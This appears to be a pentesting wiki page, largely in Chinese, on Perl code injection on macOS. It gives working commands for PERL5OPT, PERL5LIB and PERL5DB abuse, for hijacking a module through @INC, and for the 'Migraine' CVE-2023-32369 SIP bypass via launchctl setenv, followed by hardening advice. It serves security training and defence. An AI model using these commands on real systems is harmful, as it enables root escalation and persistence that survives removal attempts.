# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

使用环境变量 **`PERL5OPT`**，可以让 **Perl** 在解释器启动时执行任意命令（甚至在解析目标脚本的第一行之前）。
例如，创建以下脚本：
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
现在**导出环境变量**并执行**perl**脚本：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
另一种选择是创建一个 Perl 模块（例如 `/tmp/pmod.pm`）：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
然后使用环境变量，使模块能够被自动定位并加载：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### 其他有趣的 environment variables

* **`PERL5DB`** – 当 interpreter 使用 **`-d`**（debugger）flag 启动时，`PERL5DB` 的内容会作为 Perl code 在 *debugger context* 中执行。
如果你能够同时影响 privileged Perl process 的 environment 和 command-line flags，就可以执行如下操作：

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – 在 Windows 上，此 variable 控制 Perl 在需要 spawn shell 时使用哪个 shell executable。这里只为完整性提及，因为它与 macOS 无关。

虽然 `PERL5DB` 需要 `-d` switch，但经常可以发现某些 maintenance 或 installer scripts 以 *root* 身份并启用此 flag 执行，以便进行 verbose troubleshooting，因此该 variable 是一个有效的 escalation vector。

## 通过 dependencies（@INC abuse）

可以通过运行以下命令列出 Perl 将搜索的 include path（**`@INC`**）：
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14 上的典型输出如下：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
某些返回的文件夹甚至并不存在，不过 **`/Library/Perl/5.30`** 确实存在，*不受* SIP 保护，并且位于受 SIP 保护的文件夹之前。因此，如果你能够以 *root* 身份写入，就可以放置一个恶意模块（例如 `File/Basename.pm`），任何导入该模块的特权脚本都会*优先*加载它。

> [!WARNING]
> 你仍然需要 **root** 才能写入 `/Library/Perl`，并且 macOS 会显示一个 **TCC** 提示，要求为执行写入操作的进程授予*完全磁盘访问权限*。

例如，如果某个脚本导入了 **`use File::Basename;`**，就可以创建包含攻击者控制代码的 `/Library/Perl/5.30/File/Basename.pm`。

## 通过 Migration Assistant 绕过 SIP（CVE-2023-32369 “Migraine”）

2023 年 5 月，Microsoft 披露了 **CVE-2023-32369**，绰号为 **Migraine**。这是一种 post-exploitation 技术，允许 *root* 攻击者完全**绕过系统完整性保护（SIP）**。
存在漏洞的组件是 **`systemmigrationd`**，这是一个具有 **`com.apple.rootless.install.heritable`** entitlement 的 daemon。该 daemon 启动的任何子进程都会继承此 entitlement，因此能够在 **SIP** 限制之外运行。<sup>[1]</sup>

研究人员发现的子进程之一是 Apple 签名的解释器：<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
由于 Perl 会遵循 `PERL5OPT`（而 Bash 会遵循 `BASH_ENV`），因此在没有 SIP 的上下文中，只需污染 daemon 的*环境变量*，即可获得任意代码执行权限：<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
当 `migrateLocalKDC` 运行时，`/usr/bin/perl` 会携带恶意的 `PERL5OPT` 启动，并在 SIP 重新启用**之前**执行 `/private/tmp/migraine.sh`。通过该脚本，你可以例如将 payload 复制到 **`/System/Library/LaunchDaemons`** 中，或为文件分配 `com.apple.rootless` extended attribute，使其**无法删除**。

Apple 已在 macOS **Ventura 13.4**、**Monterey 12.6.6** 和 **Big Sur 11.7.7** 中修复该问题，但较旧或未打补丁的系统仍然容易受到攻击。<sup>[1]</sup>

## Hardening 建议

1. **清除危险变量** – 特权 launchdaemons 或 cron jobs 应在干净的环境中启动（`launchctl unsetenv PERL5OPT`、`env -i` 等）。
2. **避免以 root 身份运行 interpreters**，除非确有必要。使用 compiled binaries，或尽早 drop privileges。
3. **使用 `-T`（taint mode）运行 vendor scripts**，这样在启用 taint checking 时，Perl 会忽略 `PERL5OPT` 和其他不安全的 switches。
4. **保持 macOS 为最新版本** – “Migraine” 已在当前版本中完全修复。

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
